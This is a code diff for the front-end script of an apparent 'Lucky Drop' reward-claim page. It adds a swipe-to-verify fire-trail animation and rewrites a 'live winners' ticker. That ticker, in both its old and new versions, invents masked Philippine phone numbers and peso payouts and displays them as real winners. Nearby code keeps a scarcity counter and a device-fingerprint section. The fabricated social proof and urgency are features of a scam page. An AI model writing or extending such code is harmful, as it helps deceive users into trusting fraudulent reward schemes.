@@ -1,5 +1,5 @@
 /**
- * Lucky Drop Index Page - Swipe to Verify
+ * Lucky Drop Index Page - Swipe to Verify with Fire Trail
  */
 
 // Initialize Firebase
@@ -22,16 +22,47 @@ const claimBtn = document.getElementById('claimBtn');
 // Swipe Elements
 const swipeTrack = document.getElementById('swipeTrack');
 const swipeIcon = document.getElementById('swipeIcon');
-const swipeFire = document.getElementById('swipeFire');
+const swipeFireTrail = document.getElementById('swipeFireTrail');
 
 // Scarcity counter
 let count = 88;
+let currentTickerText = "";
 
-// ========== SWIPE FUNCTIONALITY ==========
+// ========== SWIPE WITH FIRE TRAIL ==========
 let isDragging = false;
 let startX = 0;
 let currentLeft = 0;
 let swipeCompleted = false;
+let trailInterval = null;
+
+function startFireTrail() {
+    if (trailInterval) clearInterval(trailInterval);
+    swipeFireTrail.classList.add('active');
+    trailInterval = setInterval(() => {
+        if (swipeFireTrail) {
+            swipeFireTrail.classList.remove('active');
+            setTimeout(() => {
+                if (swipeFireTrail) swipeFireTrail.classList.add('active');
+            }, 50);
+        }
+    }, 100);
+}
+
+function stopFireTrail() {
+    if (trailInterval) {
+        clearInterval(trailInterval);
+        trailInterval = null;
+    }
+    if (swipeFireTrail) {
+        swipeFireTrail.classList.remove('active');
+    }
+}
+
+function updateFireTrailPosition(leftPos, maxLeft) {
+    if (!swipeFireTrail) return;
+    const percentage = (leftPos / maxLeft) * 100;
+    swipeFireTrail.style.width = percentage + '%';
+}
 
 function initSwipe() {
     if (!swipeIcon || !swipeTrack) return;
@@ -48,6 +79,7 @@ function initSwipe() {
         startX = e.touches[0].clientX;
         currentLeft = parseInt(swipeIcon.style.left) || 0;
         swipeIcon.style.cursor = 'grabbing';
+        startFireTrail();
     });
     
     swipeIcon.addEventListener('touchmove', (e) => {
@@ -57,6 +89,7 @@ function initSwipe() {
         let newLeft = currentLeft + moveX;
         newLeft = Math.max(0, Math.min(newLeft, maxLeft));
         swipeIcon.style.left = newLeft + 'px';
+        updateFireTrailPosition(newLeft, maxLeft);
     });
     
     swipeIcon.addEventListener('touchend', (e) => {
@@ -64,6 +97,7 @@ function initSwipe() {
         e.preventDefault();
         isDragging = false;
         swipeIcon.style.cursor = 'grab';
+        stopFireTrail();
         
         const finalLeft = parseInt(swipeIcon.style.left) || 0;
         
@@ -71,6 +105,7 @@ function initSwipe() {
             completeSwipe();
         } else {
             swipeIcon.style.left = '0px';
+            if (swipeFireTrail) swipeFireTrail.style.width = '0%';
         }
     });
     
@@ -82,6 +117,7 @@ function initSwipe() {
         startX = e.clientX;
         currentLeft = parseInt(swipeIcon.style.left) || 0;
         swipeIcon.style.cursor = 'grabbing';
+        startFireTrail();
     });
     
     window.addEventListener('mousemove', (e) => {
@@ -91,12 +127,14 @@ function initSwipe() {
         let newLeft = currentLeft + moveX;
         newLeft = Math.max(0, Math.min(newLeft, maxLeft));
         swipeIcon.style.left = newLeft + 'px';
+        updateFireTrailPosition(newLeft, maxLeft);
     });
     
     window.addEventListener('mouseup', (e) => {
         if (!isDragging || swipeCompleted) return;
         isDragging = false;
         swipeIcon.style.cursor = 'grab';
+        stopFireTrail();
         
         const finalLeft = parseInt(swipeIcon.style.left) || 0;
         
@@ -104,6 +142,7 @@ function initSwipe() {
             completeSwipe();
         } else {
             swipeIcon.style.left = '0px';
+            if (swipeFireTrail) swipeFireTrail.style.width = '0%';
         }
     });
 }
@@ -112,8 +151,11 @@ async function completeSwipe() {
     if (swipeCompleted) return;
     swipeCompleted = true;
     
-    // Activate fire animation
-    swipeFire.classList.add('active');
+    // Full blaze effect
+    if (swipeFireTrail) {
+        swipeFireTrail.style.width = '100%';
+        swipeFireTrail.classList.add('active');
+    }
     
     // Play sound
     try {
@@ -136,8 +178,43 @@ async function completeSwipe() {
     }, 400);
     
     setTimeout(() => {
-        swipeFire.classList.remove('active');
+        if (swipeFireTrail) swipeFireTrail.classList.remove('active');
     }, 500);
+}
+
+// ========== LIVE WINNERS TICKER WITH TRANSITION ==========
+function updateTickerWithTransition(newText) {
+    if (!winnerEntry) return;
+    
+    winnerEntry.classList.remove('fade-in');
+    winnerEntry.classList.add('fade-out');
+    
+    setTimeout(() => {
+        winnerEntry.innerHTML = newText;
+        winnerEntry.classList.remove('fade-out');
+        winnerEntry.classList.add('fade-in');
+    }, 200);
+}
+
+function startTicker() {
+    const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
+    const amounts = [150, 300, 450, 600, 750];
+    
+    function generateWinner() {
+        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
+        const amount = amounts[Math.floor(Math.random() * amounts.length)];
+        return `${randomPrefix}***${randomSuffix} completed task +₱${amount}`;
+    }
+    
+    // Initial text
+    winnerEntry.innerHTML = generateWinner();
+    winnerEntry.classList.add('fade-in');
+    
+    setInterval(() => {
+        const newText = generateWinner();
+        updateTickerWithTransition(newText);
+    }, 4800);
 }
 
 // ========== DEVICE FINGERPRINT ==========
@@ -363,21 +440,6 @@ window.processStep1 = async function() {
         btn.innerHTML = "CLAIM REWARD";
     }
 };
-
-// ========== LIVE WINNERS TICKER ==========
-function startTicker() {
-    setInterval(() => {
-        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
-        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-        const amounts = [150, 300, 450, 600, 750];
-        const amount = amounts[Math.floor(Math.random() * amounts.length)];
-        
-        if (winnerEntry) {
-            winnerEntry.innerHTML = `🎲 ${randomPrefix}***${randomSuffix} completed task +₱${amount} 🎲`;
-        }
-    }, 4500);
-}
 
 // ========== SCARCITY COUNTER ==========
 function startScarcityCounter() {
